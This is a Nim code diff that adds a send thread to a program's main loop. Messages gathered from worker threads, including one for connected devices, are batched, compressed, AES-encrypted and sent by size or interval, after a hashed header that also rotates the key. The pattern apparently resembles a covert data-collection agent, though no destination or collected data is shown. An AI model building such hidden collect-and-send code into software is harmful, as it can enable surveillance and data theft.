@@ -168,17 +168,69 @@ when USE_CONNECTED_DEVICES_THREAD:
 
   createThread(connectedDevicesThreadVar, initConnectedDevicesThread)
 
-# wait for thread messages
+var prevThread: string = ""
+var res: string = ""
+
+from lib/threads/sendThread import initSendThread
+from lib/channels import sendThreadChannel
+
+var sendThreadVar: Thread[void]
+
+open sendThreadChannel
+
+createThread(sendThreadVar, initSendThread)
+
+import lib/more/zlibstatic/src/zlibstatic/zlib
+import lib/functions/aes
+from lib/functions/generateHeader import header
+
+# send header
+
+let headerContent: string = header()
+
+sendThreadChannel.send encrypt compress(headerContent, stream = RAW_DEFLATE)
+
+from std/sha1 import secureHash
+from std/sha1 import `$`
+
+# generate new key
+config.key = $secureHash headerContent & config.key & config.aad & config.iv
+
 from os import sleep
+from lib/flags import SEND_SIZE
+from lib/flags import TICK_INTERVAL
+from lib/flags import SEND_INTERVAL
 
+var TICKS: int = 0
+var finalData: string
+
+# wait for thread messages
 while true:
-  let channel: tuple[dataAvailable: bool, msg: string] = mainChannel.tryRecv()
+  let (dataAvailable, msg) = mainChannel.tryRecv()
 
-  if channel.dataAvailable:
-    echo channel.msg
+  if dataAvailable:
+    let (thread, data) = msg
 
-  ## TODO: n as vrea sa folosesc sleep(10)
-  ## asa ca e probabil sa modifc aici oricand
-  sleep(10)
+    if prevThread != thread:
+      prevThread = thread
+      res.add "." & thread & ","
+    res.add ";" & data
+
+    finalData = encrypt compress(res, stream = RAW_DEFLATE)
+
+    if finalData.len > SEND_SIZE:
+      sendThreadChannel.send finalData
+      TICKS = 0
+      res = ""
+      prevThread = ""
+
+  if TICKS == SEND_INTERVAL:
+    sendThreadChannel.send finalData
+    TICKS = 0
+    res = ""
+    prevThread = ""
+
+  sleep(TICK_INTERVAL)
+  TICKS += 1
 
 close mainChannel
